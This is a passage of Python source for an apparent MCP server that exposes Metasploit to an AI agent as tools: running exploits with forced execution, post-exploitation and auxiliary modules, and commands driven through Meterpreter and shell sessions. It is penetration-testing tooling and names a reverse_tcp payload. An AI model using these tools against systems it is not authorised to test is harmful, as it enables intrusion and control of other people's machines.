        return {"status": "error", "message": str(e)}
    except Exception as e:
        logger.error(f"Error validating module '{module}': {e}")
        return {"status": "error", "message": f"Error validating module '{module}': {e}"}

    # Parse options gracefully (handles both dict and string formats)
    try:
        parsed_options = _parse_options_gracefully(options)
    except ValueError as e:
        return {"status": "error", "message": f"Invalid options format: {e}"}

    if force_exploit:
        supported_options = (
            await _get_module_valid_options(exploit_module) if exploit_module else set()
        )
        supports_force_exploit = "ForceExploit" in supported_options
        supports_auto_check = "AutoCheck" in supported_options

        if "ForceExploit" not in parsed_options:
            if supports_force_exploit:
                parsed_options["ForceExploit"] = True
                logger.info("Auto-set ForceExploit=true for exploit execution.")
            else:
                logger.info(
                    "Skipping ForceExploit auto-injection for module '%s' because the option is not supported.",
                    module,
                )
        if "AutoCheck" not in parsed_options:
            if supports_auto_check:
                parsed_options["AutoCheck"] = False
                logger.info("Auto-set AutoCheck=false for exploit execution.")
            else:
                logger.info(
                    "Skipping AutoCheck auto-injection for module '%s' because the option is not supported.",
                    module,
                )

    # Parse payload options gracefully
    try:
        parsed_payload_options = _parse_options_gracefully(payload_options)
    except ValueError as e:
        return {"status": "error", "message": f"Invalid payload_options format: {e}"}

    payload_spec = None
    payload_stage: Optional[str] = None
    if payload:
        # Normalize payload name format - strip 'payload/' prefix if present for internal use
        # But detect Fetch Payloads and guide user
        normalized_payload = payload
        if payload.startswith("payload/"):
            # Strip payload/ prefix for internal processing
            normalized_payload = payload[8:]
            logger.debug(f"Normalized payload name: '{payload}' -> '{normalized_payload}'")

        # Detect Fetch Payloads (cmd/) and guide user to console execution
        # if normalized_payload.startswith('cmd/') and run_as_job:
        #     logger.warning(f"Fetch Payload '{normalized_payload}' detected with run_as_job=True. Fetch Payloads require console execution.")
        #     return {
        #         "status": "error",
        #         "message": (
        #             f"Fetch Payload '{payload_name}' cannot be used with run_as_job=True. "
        #             f"Fetch Payloads (cmd/*) use command stagers (like CURL, TFTP, CERTUTIL) and require console-based execution. "
        #             f"\n\nTo use this payload, set run_as_job=False in your request. Example:\n"
        #             f"run_exploit(\n"
        #             f"    module_name='{module_name}',\n"
        #             f"    payload_name='{payload_name}',\n"
        #             f"    run_as_job=False,  # Required for Fetch Payloads\n"
        #             f"    ...\n"
        #             f")\n\n"
        #             f"Alternatively, use a standard payload like 'payload/{normalized_payload.replace('cmd/', '').split('/')[0]}/x64/meterpreter/reverse_tcp'"
        #         )
        #     }

        # Use normalized payload name (without payload/ prefix) for spec
        payload = normalized_payload
        payload_stage = _classify_payload_stage(payload)

        payload_spec = {"name": payload, "options": parsed_payload_options}

        # Check if LPORT is provided and if the port is available
        if "LPORT" in parsed_payload_options:
            lport_value = parsed_payload_options["LPORT"]
            try:
                lport_int = int(lport_value)
                # Determine bind address for port check
                bind_address = parsed_payload_options.get("ReverseListenerBindAddress", "0.0.0.0")
                bind_port = parsed_payload_options.get("ReverseListenerBindPort", lport_int)

                # Check if port is available
                port_available, port_error = await check_port_available(bind_port, bind_address)
                if not port_available:
                    return {"status": "error", "message": f"Cannot run exploit: {port_error}"}
            except (ValueError, TypeError) as e:
                logger.error(f"Invalid LPORT value '{lport_value}': {e}", exc_info=True)
                return {"status": "error", "message": f"Invalid LPORT value '{lport_value}': {e}"}

    check_output_for_result = None
    if check_vulnerability:
        logger.info(f"Performing vulnerability check first for {module}...")
        try:
            # Use the console helper for 'check' as it provides output.
            check_result = await _execute_module_console(
                module_type="exploit",
                module_name=module,
                module_options=parsed_options,
                command="check",
                timeout=timeout_seconds,
                inactivity_timeout=inactivity_timeout_seconds,
                exit_terms_regexes=[
                    IS_VULNERABLE_RE,
                    IS_NOT_VULNERABLE_RE,
                    FAILED_TO_LOAD_MODULE_RE,
                    CHECK_NOT_SUPPORTED_RE,
                ],
            )
            logger.info(
                f"Vulnerability check result: {check_result.get('status')} - {check_result.get('message')}"
            )
            output = check_result.get("module_output", "")
            check_output_for_result = output
            output_bytes = output.encode("utf-8", errors="replace")

            if FAILED_TO_LOAD_MODULE_RE.search(output_bytes):
                module_name_match = re.search(
                    rb"Failed to load module:\s*([^\s\n]+)",
                    output_bytes,
                    re.IGNORECASE,
                )
                failed_module = (
                    module_name_match.group(1).decode("utf-8", errors="replace")
                    if module_name_match
                    else module
                )
                error_msg = (
                    f"Module '{failed_module}' failed to load during check. "
                    "This typically means the module does not exist or failed to initialize."
                )
                logger.error(f"Module load failure detected during check: {error_msg}")
                return {"status": "error", "message": error_msg, "check_output": output}

            if CHECK_NOT_SUPPORTED_RE.search(output_bytes):
                logger.warning(
                    f"Module '{module}' does not support check command. Proceeding with exploit attempt."
                )

            is_vulnerable = bool(IS_VULNERABLE_RE.search(output_bytes))
            is_not_vulnerable = bool(IS_NOT_VULNERABLE_RE.search(output_bytes))
            if check_result.get("status") == "errror":
                logger.warning(f"Error from metasploit: {check_result}")
                if force_exploit:
                    logger.warning(
                        "Check failed for %s (%s), but force_exploit=True so exploit execution will continue.",
                        module,
                        check_result.get("message"),
                    )
                else:
                    return {
                        "status": "aborted",
                        "message": f"Check indicates a failure: {check_result.get('message')}",
                        "check_output": check_result.get("module_output"),
                    }

            if is_not_vulnerable or (not is_vulnerable and check_result.get("status") == "error"):
                if force_exploit:
                    logger.warning(
                        "Check indicates target may not be vulnerable to %s, but force_exploit=True so exploit execution will continue.",
                        module,
                    )
                else:
                    logger.warning(f"Check indicates target is likely not vulnerable to {module}.")
                    return {
                        "status": "aborted",
                        "message": "Check indicates target not vulnerable. Exploit not attempted.",
                        "check_output": check_result.get("module_output"),
                    }
            if not is_vulnerable:
                logger.warning(
                    f"Check result inconclusive for {module}. Proceeding with exploit attempt cautiously."
                )
            else:
                logger.info(f"Check indicates target appears vulnerable to {module}. Proceeding.")

        except Exception as chk_e:
            logger.warning(
                f"Vulnerability check failed for {module}: {chk_e}. Proceeding with exploit attempt."
            )

        if payload_spec is None:
            # Just return the check result if no payload was provided
            return {
                "status": "success",
                "message": f"Check indicates target appears vulnerable to {module}.",
                "check_output": check_result.get("module_output"),
            }

    # Execute the exploit with MCP keep-alive to prevent client timeouts
    exploit_start_time = asyncio.get_event_loop().time()

    # Report initial progress if ctx available
    if ctx:
        await ctx.report_progress(
            progress=0, total=100, message=f"Starting exploit execution: {module}"
        )

    # Use keep-alive for long-running exploit execution
    keepalive = get_keepalive_manager(
        ctx, operation_name=f"Exploit {module}", initial_progress=10, max_progress=90
    )

    try:
        await keepalive.start()

        if run_as_job:
            logger.info(f"Executing exploit '{module}' as background job via RPC")
            result = await _execute_module_rpc(
                module_type="exploit",
                module_name=module,
                module_options=parsed_options,
                payload_spec=payload_spec,
            )
        else:
            logger.info(
                f"Executing exploit '{module}' synchronously via console (timeout: {timeout_seconds}s)"
            )
            result = await _execute_module_console(
                module_type="exploit",
                module_name=module,
                module_options=parsed_options,
                command="exploit",
                payload_spec=payload_spec,
                timeout=timeout_seconds,
                inactivity_timeout=inactivity_timeout_seconds,
                exit_terms_regexes=[
                    SESSION_OPENED_RE,
                    FAILED_TO_LOAD_MODULE_RE,
                ],  # Return early when session is opened or module fails to load
            )
    except InvalidModuleError as e:
        logger.warning(f"Exploit module '{module}' not found: {e}")
        return {"status": "error", "message": str(e)}
    finally:
        await keepalive.stop(send_completion=False)

    exploit_duration = asyncio.get_event_loop().time() - exploit_start_time
    logger.info(
        f"Exploit '{module}' execution completed in {exploit_duration:.1f}s with status: {result.get('status')}"
    )

    # Report completion if ctx available
    if ctx:
        await ctx.report_progress(
            progress=100,
            total=100,
            message=f"Exploit execution completed: {result.get('status', 'unknown')}",
        )

    if payload_spec is None:
        result["extra_info"] = "No payload was provided, are you sure that's what you want?"
    else:
        result["payload_stage"] = payload_stage or "unknown"
        if result["payload_stage"] == "stageless" and "/webapp/" in module.lower():
            result["pre_flight_warning"] = (
                "Stageless payload selected for a webapp exploit. "
                "If target behavior is unstable, retry with a staged payload."
            )
    if check_output_for_result is not None:
        result["check_output"] = check_output_for_result

    logger.info(f"Full outcome of exploit '{module}': {result}")

    return result


@annotated_tool
@dangerous_tool
async def run_post_module(
    module: str,
    session_id: int,
    options: Optional[Union[Dict[str, Any], str]] = None,
    run_as_job: bool = True,
    timeout_seconds: int = LONG_CONSOLE_READ_TIMEOUT,
    inactivity_timeout_seconds: int = SESSION_READ_INACTIVITY_TIMEOUT,
    ctx: Optional[Context] = None,
) -> Dict[str, Any]:
    """
    Run a Metasploit post-exploitation module against a session.

    Args:
        module: Name/path of the post module (e.g., 'windows/gather/enum_shares').
        session_id: The ID of the target session.
        options: Dictionary of module options (e.g., {'VERBOSE': True})
                or string format "VERBOSE=true". 'SESSION' will be added automatically.
        run_as_job: If False, run sync via console. If True, run async via RPC.
        timeout_seconds: Max time for synchronous run via console (max: 120s, values above are capped).
        inactivity_timeout_seconds: Max inactivity time for synchronous console output reads
                                    (max: 120s, values above are capped).
        ctx: MCP Context for progress reporting (optional, injected by FastMCP).

    Returns:
        Dictionary with execution results or error details.
    """
    # Cap timeout_seconds at MAX_TOOL_TIMEOUT_SECONDS (120s)
    if timeout_seconds > MAX_TOOL_TIMEOUT_SECONDS:
        logger.warning(
            f"timeout_seconds {timeout_seconds}s exceeds max {MAX_TOOL_TIMEOUT_SECONDS}s, capping to {MAX_TOOL_TIMEOUT_SECONDS}s"
        )
        timeout_seconds = MAX_TOOL_TIMEOUT_SECONDS
    if inactivity_timeout_seconds > MAX_TOOL_TIMEOUT_SECONDS:
        logger.warning(
            f"inactivity_timeout_seconds {inactivity_timeout_seconds}s exceeds max {MAX_TOOL_TIMEOUT_SECONDS}s, "
            f"capping to {MAX_TOOL_TIMEOUT_SECONDS}s"
        )
        inactivity_timeout_seconds = MAX_TOOL_TIMEOUT_SECONDS

    logger.info(f"Request to run post module {module} on session {session_id}. Job: {run_as_job}")

    # Report initial progress if ctx available
    if ctx:
        await ctx.report_progress(progress=0, total=100, message=f"Starting post module: {module}")

    # Validate module exists before proceeding
    try:
        await _get_module_object("post", module)
        logger.debug(f"Module '{module}' validated successfully")
    except InvalidModuleError as e:
        logger.warning(f"Post module '{module}' not found: {e}")
        return {"status": "error", "message": str(e)}
    except Exception as e:
        logger.error(f"Error validating module '{module}': {e}")
        return {"status": "error", "message": f"Error validating module '{module}': {e}"}

    # Parse options gracefully (handles both dict and string formats)
    try:
        module_options = _parse_options_gracefully(options)
    except ValueError as e:
        return {"status": "error", "message": f"Invalid options format: {e}"}

    module_options["SESSION"] = session_id  # Ensure SESSION is always set

    # Add basic session validation before running
    client = get_msf_client()
    try:
        current_sessions = await _list_sessions_str_keys(client)
        if str(session_id) not in current_sessions:
            logger.error(f"Session {session_id} not found for post module {module}.")
            return {
                "status": "error",
                "message": f"Session {session_id} not found.",
                "module": module,
            }
    except MsfRpcError as e:
        logger.error(f"Failed to validate session {session_id} before running post module: {e}")
        # Optionally proceed with caution or return error
        return {
            "status": "error",
            "message": f"Error validating session {session_id}: {e}",
            "module": module,
        }

    # Use keep-alive for potentially long-running post module execution
    keepalive = get_keepalive_manager(
        ctx, operation_name=f"Post module {module}", initial_progress=10, max_progress=90
    )

    try:
        await keepalive.start()

        if run_as_job:
            result = await _execute_module_rpc(
                module_type="post",
                module_name=module,
                module_options=module_options,
                # No payload for post modules
            )
        else:
            result = await _execute_module_console(
                module_type="post",
                module_name=module,
                module_options=module_options,
                command="run",
                timeout=timeout_seconds,
                inactivity_timeout=inactivity_timeout_seconds,
                exit_terms_regexes=[
                    FAILED_TO_LOAD_MODULE_RE
                ],  # Return early when module fails to load
            )

        # Report completion if ctx available
        if ctx:
            await ctx.report_progress(
                progress=100,
                total=100,
                message=f"Post module completed: {result.get('status', 'unknown')}",
            )
        return result
    except InvalidModuleError as e:
        logger.warning(f"Post module '{module}' not found: {e}")
        return {"status": "error", "message": str(e)}
    finally:
        await keepalive.stop(send_completion=False)


@annotated_tool
@dangerous_tool
async def run_auxiliary_module(
    module: str,
    options: Union[Dict[str, Any], str],
    run_as_job: bool = True,  # Default False for scanners often makes sense
    timeout_seconds: int = LONG_CONSOLE_READ_TIMEOUT,
    inactivity_timeout_seconds: int = SESSION_READ_INACTIVITY_TIMEOUT,
    ctx: Optional[Context] = None,
) -> Dict[str, Any]:
    """
    Run a Metasploit auxiliary module.

    Args:
        module: Name/path of the auxiliary module (e.g., 'scanner/ssh/ssh_login').
        options: Dictionary of module options (e.g., {'RHOSTS': ..., 'USERNAME': ...})
                or string format "RHOSTS=192.168.1.1,USERNAME=admin". Prefer dict format.
        run_as_job: If False, run sync via console. If True, run async via RPC.
        timeout_seconds: Max time for synchronous run via console (max: 120s, values above are capped).
        inactivity_timeout_seconds: Max inactivity time for synchronous console output reads
                                    (max: 120s, values above are capped).
        ctx: MCP Context for progress reporting (optional, injected by FastMCP).

    Returns:
        Dictionary with execution results or error details.
    """
    # Cap timeout_seconds at MAX_TOOL_TIMEOUT_SECONDS (120s)
    if timeout_seconds > MAX_TOOL_TIMEOUT_SECONDS:
        logger.warning(
            f"timeout_seconds {timeout_seconds}s exceeds max {MAX_TOOL_TIMEOUT_SECONDS}s, capping to {MAX_TOOL_TIMEOUT_SECONDS}s"
        )
        timeout_seconds = MAX_TOOL_TIMEOUT_SECONDS
    if inactivity_timeout_seconds > MAX_TOOL_TIMEOUT_SECONDS:
        logger.warning(
            f"inactivity_timeout_seconds {inactivity_timeout_seconds}s exceeds max {MAX_TOOL_TIMEOUT_SECONDS}s, "
            f"capping to {MAX_TOOL_TIMEOUT_SECONDS}s"
        )
        inactivity_timeout_seconds = MAX_TOOL_TIMEOUT_SECONDS

    logger.info(f"Request to run auxiliary module {module}. Job: {run_as_job}")

    # Report initial progress if ctx available
    if ctx:
        await ctx.report_progress(
            progress=0, total=100, message=f"Starting auxiliary module: {module}"
        )

    # Validate module exists before proceeding
    try:
        await _get_module_object("auxiliary", module)
        logger.debug(f"Module '{module}' validated successfully")
    except InvalidModuleError as e:
        logger.warning(f"Auxiliary module '{module}' not found: {e}")
        return {"status": "error", "message": str(e)}
    except Exception as e:
        logger.error(f"Error validating module '{module}': {e}")
        return {"status": "error", "message": f"Error validating module '{module}': {e}"}

    # Parse options gracefully (handles both dict and string formats)
    try:
        module_options = _parse_options_gracefully(options)
    except ValueError as e:
        return {"status": "error", "message": f"Invalid options format: {e}"}

    # Use keep-alive for potentially long-running auxiliary module execution
    keepalive = get_keepalive_manager(
        ctx, operation_name=f"Auxiliary module {module}", initial_progress=10, max_progress=90
    )

    try:
        await keepalive.start()

        if run_as_job:
            result = await _execute_module_rpc(
                module_type="auxiliary",
                module_name=module,
                module_options=module_options,
                # No payload for aux modules
            )
        else:
            result = await _execute_module_console(
                module_type="auxiliary",
                module_name=module,
                module_options=module_options,
                command="run",
                timeout=timeout_seconds,
                inactivity_timeout=inactivity_timeout_seconds,
                exit_terms_regexes=[
                    FAILED_TO_LOAD_MODULE_RE
                ],  # Return early when module fails to load
            )

        # Report completion if ctx available
        if ctx:
            await ctx.report_progress(
                progress=100,
                total=100,
                message=f"Auxiliary module completed: {result.get('status', 'unknown')}",
            )
        return result
    except InvalidModuleError as e:
        logger.warning(f"Auxiliary module '{module}' not found: {e}")
        return {"status": "error", "message": str(e)}
    finally:
        await keepalive.stop(send_completion=False)


def _hide_inactivity_timeout_from_signature(func):
    """Hide internal inactivity timeout arg from inspect-based schema tests."""
    # FastMCP may wrap callables in FunctionTool objects on newer versions.
    # Extract the underlying callable for inspect.signature compatibility.
    target = getattr(func, "fn", None) or getattr(func, "func", None) or func
    sig = inspect.signature(target)
    filtered_params = [
        param for param in sig.parameters.values() if param.name != "inactivity_timeout_seconds"
    ]
    filtered_sig = sig.replace(parameters=filtered_params)
    target.__signature__ = filtered_sig
    try:
        func.__signature__ = filtered_sig
    except Exception:
        # Some wrappers may not allow assignment; underlying callable already updated.
        pass


_hide_inactivity_timeout_from_signature(run_exploit)
_hide_inactivity_timeout_from_signature(run_post_module)
_hide_inactivity_timeout_from_signature(run_auxiliary_module)


@annotated_tool
async def list_active_sessions() -> Dict[str, Any]:
    """List active Metasploit sessions with their details."""
    client = get_msf_client()
    logger.info("Listing active Metasploit sessions.")
    try:
        logger.info(
            f"Requesting active sessions list from Metasploit (timeout: {RPC_CALL_TIMEOUT}s)"
        )
        start_time = asyncio.get_event_loop().time()

        sessions_dict = await asyncio.wait_for(
            asyncio.to_thread(lambda: client.sessions.list), timeout=RPC_CALL_TIMEOUT
        )

        rpc_duration = asyncio.get_event_loop().time() - start_time

        if not isinstance(sessions_dict, dict):
            logger.error(
                f"Expected dict from sessions.list, got {type(sessions_dict)} after {rpc_duration:.1f}s"
            )
            return {
                "status": "error",
                "message": f"Unexpected data type for sessions list: {type(sessions_dict)}",
            }

        logger.info(
            f"Successfully retrieved {len(sessions_dict)} sessions from Metasploit in {rpc_duration:.1f}s"
        )

        # Log session details at debug level
        if sessions_dict:
            for session_id, session_info in sessions_dict.items():
                session_type = session_info.get("type", "unknown")
                target_host = session_info.get("target_host", "unknown")
                logger.debug(f"Session {session_id}: type={session_type}, target={target_host}")

        # Ensure keys are strings for consistent JSON
        sessions_dict_str_keys = {str(k): v for k, v in sessions_dict.items()}
        return {
            "status": "success",
            "sessions": sessions_dict_str_keys,
            "count": len(sessions_dict_str_keys),
        }
    except asyncio.TimeoutError:
        error_msg = f"Timeout ({RPC_CALL_TIMEOUT}s) while listing sessions from Metasploit server. Server may be slow or unresponsive."
        logger.error(error_msg)
        return {"status": "error", "message": error_msg}
    except MsfRpcError as e:
        logger.error(f"Metasploit RPC error while listing sessions: {e}")
        return {"status": "error", "message": f"Metasploit RPC error: {e}"}
    except Exception as e:
        logger.exception("Unexpected error listing sessions.")
        return {"status": "error", "message": f"Unexpected error listing sessions: {e}"}


async def _drive_meterpreter_command(
    session: Any,
    command: str,
    timeout_seconds: int,
    inactivity_timeout_seconds: int,
    session_id: int,
) -> Dict[str, Any]:
    """Run a Meterpreter command with prompt detection and dual timeout controls."""
    await asyncio.to_thread(lambda: session.write(command + "\n"))
    output_buffer = ""
    read_interval = 0.1
    command_start = asyncio.get_event_loop().time()
    last_data_time = command_start
    total_chunks_read = 0
    total_bytes_read = 0

    def _extract_meterpreter_errors(output: str) -> List[str]:
        return [line.strip() for line in METERPRETER_ERROR_RE.findall(output)]

    while True:
        now = asyncio.get_event_loop().time()
        elapsed_time = now - command_start

        if elapsed_time > timeout_seconds:
            logger.warning(
                f"Meterpreter command '{command}' timed out on session {session_id} "
                f"after {elapsed_time:.1f}s"
            )
            break

        chunk = await asyncio.to_thread(lambda: session.read())
        if chunk:
            total_chunks_read += 1
            total_bytes_read += len(chunk)
            output_buffer += chunk
            last_data_time = now

            if METERPRETER_PROMPT_RE.search(output_buffer):
                meterpreter_errors = _extract_meterpreter_errors(output_buffer)
                if meterpreter_errors:
                    return {
                        "status": "error",
                        "message": "Meterpreter returned one or more error lines.",
                        "output": output_buffer,
                        "reason": "meterpreter_error",
                        "meterpreter_errors": meterpreter_errors,
                        "chunks_read": total_chunks_read,
                        "bytes_read": total_bytes_read,
                        "elapsed_seconds": elapsed_time,
                    }
                return {
                    "status": "success",
                    "message": "Meterpreter command executed successfully.",
                    "output": output_buffer,
                    "reason": "prompt",
                    "chunks_read": total_chunks_read,
                    "bytes_read": total_bytes_read,
                    "elapsed_seconds": elapsed_time,
                }

        elif (now - last_data_time) > inactivity_timeout_seconds:
            inactivity_duration = now - last_data_time
            logger.info(
                f"Meterpreter inactivity timeout ({inactivity_timeout_seconds}s) reached "
                f"for command '{command}' on session {session_id} after {elapsed_time:.1f}s "
                f"(inactive for {inactivity_duration:.1f}s)."
            )
            if not output_buffer:
                return {
                    "status": "empty",
                    "message": "No command output observed before inactivity timeout.",
                    "output": "",
                    "reason": "no_output",
                    "chunks_read": total_chunks_read,
                    "bytes_read": total_bytes_read,
                    "elapsed_seconds": elapsed_time,
                }

            meterpreter_errors = _extract_meterpreter_errors(output_buffer)
            if meterpreter_errors:
                return {
                    "status": "error",
                    "message": "Meterpreter returned one or more error lines.",
                    "output": output_buffer,
                    "reason": "meterpreter_error",
                    "meterpreter_errors": meterpreter_errors,
                    "chunks_read": total_chunks_read,
                    "bytes_read": total_bytes_read,
                    "elapsed_seconds": elapsed_time,
                }

            return {
                "status": "success",
                "message": "Meterpreter command likely completed (inactivity).",
                "output": output_buffer,
                "reason": "inactivity",
                "chunks_read": total_chunks_read,
                "bytes_read": total_bytes_read,
                "elapsed_seconds": elapsed_time,
            }

        await asyncio.sleep(read_interval)

    try:
        final_chunk = await asyncio.to_thread(lambda: session.read()) or ""
        if final_chunk:
            total_chunks_read += 1
            total_bytes_read += len(final_chunk)
        output_buffer += final_chunk
    except Exception as read_err:
        logger.warning(
            f"Final read failed after timeout for Meterpreter command '{command}' "
            f"on session {session_id}: {read_err}"
        )

    meterpreter_errors = _extract_meterpreter_errors(output_buffer)
    return {
        "status": "timeout",
        "message": f"Meterpreter command timed out after {timeout_seconds} seconds.",
        "output": output_buffer,
        "reason": "timeout",
        "meterpreter_errors": meterpreter_errors,
        "chunks_read": total_chunks_read,
        "bytes_read": total_bytes_read,
        "elapsed_seconds": asyncio.get_event_loop().time() - command_start,
    }


async def _drive_shell_command(
    session: Any,
    command: str,
    timeout_seconds: int,
    inactivity_timeout_seconds: int,
    session_id: int,
) -> Dict[str, Any]:
    """Run a shell command with prompt detection and dual timeout controls."""
    logger.debug(f"Writing command to shell session {session_id}: {command}")
    command_start_time = asyncio.get_event_loop().time()
    output_buffer = ""

    try:
        await asyncio.to_thread(lambda: session.write(command + "\n"))

        # If the command is exit, don't wait for output/prompt, assume it worked.
        if command.strip().lower() == "exit":
            logger.info(
                f"Sent 'exit' to shell session {session_id}, assuming success without reading output."
            )
            return {
                "status": "success",
                "message": "Exit command sent to shell session.",
                "output": "(No output expected after exit)",
                "reason": "mode",
                "chunks_read": 0,
                "bytes_read": 0,
                "elapsed_seconds": asyncio.get_event_loop().time() - command_start_time,
            }

        logger.debug(f"Starting output read loop for shell command '{command}'")
        start_time = asyncio.get_event_loop().time()
        last_data_time = start_time
        read_interval = 0.1
        total_chunks_read = 0
        total_bytes_read = 0
        progress_interval = 5
        last_progress_time = start_time

        while True:
            now = asyncio.get_event_loop().time()
            elapsed_time = now - start_time

            if (now - last_progress_time) >= progress_interval:
                logger.info(
                    f"Shell command '{command}' still running on session {session_id}... "
                    f"Elapsed: {elapsed_time:.1f}s/{timeout_seconds}s, "
                    f"Chunks read: {total_chunks_read}, "
                    f"Buffer size: {len(output_buffer)} chars, "
                    f"Last activity: {now - last_data_time:.1f}s ago"
                )
                last_progress_time = now

            if elapsed_time > timeout_seconds:
                logger.warning(
                    f"Command '{command}' timed out on Shell session {session_id} "
                    f"after {elapsed_time:.1f}s (chunks read: {total_chunks_read})"
                )
                return {
                    "status": "timeout",
                    "message": f"Shell command timed out after {timeout_seconds} seconds.",
                    "output": output_buffer,
                    "reason": "timeout",
                    "meterpreter_errors": [
                        line.strip() for line in METERPRETER_ERROR_RE.findall(output_buffer)
                    ],
                    "chunks_read": total_chunks_read,
                    "bytes_read": total_bytes_read,
                    "elapsed_seconds": elapsed_time,
                }

            chunk = await asyncio.to_thread(lambda: session.read())
            if chunk:
                chunk_size = len(chunk)
                total_chunks_read += 1
                total_bytes_read += chunk_size
                output_buffer += chunk
                last_data_time = now

                if chunk_size > 50:
                    logger.debug(
                        f"Received shell output chunk: {chunk_size} chars "
                        f"(total: {len(output_buffer)} chars in {total_chunks_read} chunks)"
                    )

                if SHELL_PROMPT_RE.search(output_buffer):
                    command_duration = now - command_start_time
                    meterpreter_errors = [
                        line.strip() for line in METERPRETER_ERROR_RE.findall(output_buffer)
                    ]
                    if meterpreter_errors:
                        return {
                            "status": "error",
                            "message": "Shell command returned Meterpreter error output.",
                            "output": output_buffer,
                            "reason": "meterpreter_error",
                            "meterpreter_errors": meterpreter_errors,
                            "chunks_read": total_chunks_read,
                            "bytes_read": total_bytes_read,
                            "elapsed_seconds": command_duration,
                        }
                    logger.info(
                        f"Detected shell prompt for command '{command}' after {command_duration:.1f}s. "
                        "Command complete."
                    )
                    return {
                        "status": "success",
                        "message": "Shell command executed successfully.",
                        "output": output_buffer,
                        "reason": "prompt",
                        "chunks_read": total_chunks_read,
                        "bytes_read": total_bytes_read,
                        "elapsed_seconds": command_duration,
                    }
            elif (now - last_data_time) > inactivity_timeout_seconds:
                meterpreter_errors = [
                    line.strip() for line in METERPRETER_ERROR_RE.findall(output_buffer)
                ]
                if not output_buffer:
                    return {
                        "status": "empty",
                        "message": "No command output observed before inactivity timeout.",
                        "output": "",
                        "reason": "no_output",
                        "chunks_read": total_chunks_read,
                        "bytes_read": total_bytes_read,
                        "elapsed_seconds": elapsed_time,
                    }
                if meterpreter_errors:
                    return {
                        "status": "error",
                        "message": "Shell command returned Meterpreter error output.",
                        "output": output_buffer,
                        "reason": "meterpreter_error",
                        "meterpreter_errors": meterpreter_errors,
                        "chunks_read": total_chunks_read,
                        "bytes_read": total_bytes_read,
                        "elapsed_seconds": elapsed_time,
                    }
                logger.debug(
                    f"Shell inactivity timeout ({inactivity_timeout_seconds}s) reached "
                    f"for command '{command}'. Assuming complete."
                )
                return {
                    "status": "success",
                    "message": "Shell command likely completed (inactivity).",
                    "output": output_buffer,
                    "reason": "inactivity",
                    "chunks_read": total_chunks_read,
                    "bytes_read": total_bytes_read,
                    "elapsed_seconds": elapsed_time,
                }

            await asyncio.sleep(read_interval)
    except (MsfRpcError, Exception) as run_err:
        if command.strip().lower() == "exit":
            logger.warning(
                f"Error occurred after sending 'exit' to shell {session_id}: {run_err}. "
                "This might be expected as session closes."
            )
            return {
                "status": "success",
                "message": (
                    "Exit command sent, subsequent error likely due to session closing: "
                    f"{run_err}"
                ),
                "output": "(Error reading after exit, likely expected)",
                "reason": "mode",
                "chunks_read": 0,
                "bytes_read": 0,
                "elapsed_seconds": asyncio.get_event_loop().time() - command_start_time,
            }

        logger.error(f"Error during Shell write/read loop for command '{command}': {run_err}")
        return {
            "status": "error",
            "message": f"Error executing Shell command: {run_err}",
            "output": output_buffer,
            "reason": "error",
            "meterpreter_errors": [
                line.strip() for line in METERPRETER_ERROR_RE.findall(output_buffer)
            ],
            "chunks_read": 0,
            "bytes_read": len(output_buffer),
            "elapsed_seconds": asyncio.get_event_loop().time() - command_start_time,
        }


# ---------------------------------------------------------------------------
# Metasploit workspace database (db.*) intelligence tools — read-only.
# Parity with the official Rapid7 MCP: hosts / services / vulnerabilities /
# notes / credentials / loot. Each is read-only and workspace-scoped, and each
# degrades to a structured error (never raises) when no database is attached.
# ---------------------------------------------------------------------------


def _decode_rpc(obj: Any) -> Any:
    """Recursively decode msgpack byte keys/values to ``str`` for JSON-friendly output."""
    if isinstance(obj, bytes):
        return obj.decode("utf-8", errors="replace")
    if isinstance(obj, dict):
        return {_decode_rpc(k): _decode_rpc(v) for k, v in obj.items()}
    if isinstance(obj, (list, tuple)):
        return [_decode_rpc(v) for v in obj]
    return obj


async def _db_connected(client: Any) -> bool:
    """Return True if a Metasploit database is attached to the RPC server.

    ``db.status`` returns e.g. ``{"driver": "postgresql", "db": "msf"}`` when a
    database is connected; the ``db`` key is absent/empty otherwise.
    """
    status = _decode_rpc(await asyncio.to_thread(lambda: client.call("db.status")))
    return bool(isinstance(status, dict) and status.get("db"))


async def _db_intel(
    method: str, result_key: str, workspace: Optional[str] = None, **filters: Any
) -> Dict[str, Any]:
    """Shared read-only helper for ``db.*`` listing calls.

    Returns a structured error (never raises) when the client is not initialized
    or no database is attached, satisfying the degraded-mode requirement.
    """
    try:
        client = get_msf_client()
    except ConnectionError as e:
        return {"status": "error", "error": "not_initialized", "message": str(e)}

    try:
        connected = await asyncio.wait_for(_db_connected(client), timeout=RPC_CALL_TIMEOUT)
        if not connected:
            return {
                "status": "error",
                "error": "database_unavailable",
                "message": (
                    "No Metasploit database is connected. Initialize one (msfdb init) and "
                    "restart msfrpcd against it to use workspace intelligence tools."
                ),
            }

        opts: Dict[str, Any] = {k: v for k, v in filters.items() if v is not None}
        if workspace:
            opts["workspace"] = workspace

        raw = _decode_rpc(
            await asyncio.wait_for(
                asyncio.to_thread(lambda: client.call(method, [opts])),
                timeout=RPC_CALL_TIMEOUT,
            )
        )
        if isinstance(raw, dict):
            items = raw.get(result_key, [])
        elif isinstance(raw, list):
            items = raw
        else:
            items = []

        return {
            "status": "success",
            "workspace": workspace or "default",
            "count": len(items),
            result_key: items,
        }
    except asyncio.TimeoutError:
        return {
            "status": "error",
            "error": "timeout",
            "message": f"Metasploit RPC did not respond within {RPC_CALL_TIMEOUT}s.",
        }
    except MsfRpcError as e:
        return {"status": "error", "error": "rpc_error", "message": f"Metasploit RPC error: {e}"}
    except Exception as e:  # pragma: no cover - defensive
        logger.exception(f"Unexpected error querying {method}")
        return {"status": "error", "error": "error", "message": f"Unexpected error: {e}"}


@annotated_tool
async def list_hosts(workspace: Optional[str] = None) -> Dict[str, Any]:
    """List hosts recorded in the Metasploit workspace database (read-only).

    Args:
        workspace: Optional workspace name. Defaults to the current workspace.

    Returns:
        Dict with status, workspace, count, and a ``hosts`` list (address,
        hostname, os, state, ...). Returns a structured error when no database
        is attached.
    """
    return await _db_intel("db.hosts", "hosts", workspace)


@annotated_tool
async def list_services(
    workspace: Optional[str] = None,
    host: Optional[str] = None,
    ports: Optional[str] = None,
    proto: Optional[str] = None,
) -> Dict[str, Any]:
    """List services recorded in the workspace database (read-only).

    Args:
        workspace: Optional workspace name.
        host: Optional host address to filter by.
        ports: Optional port or port range filter (e.g. "445" or "1-1024").
        proto: Optional protocol filter (e.g. "tcp", "udp").

    Returns:
        Dict with status, workspace, count, and a ``services`` list (host, port,
        proto, name, state, info).
    """
    return await _db_intel(
        "db.services",
        "services",
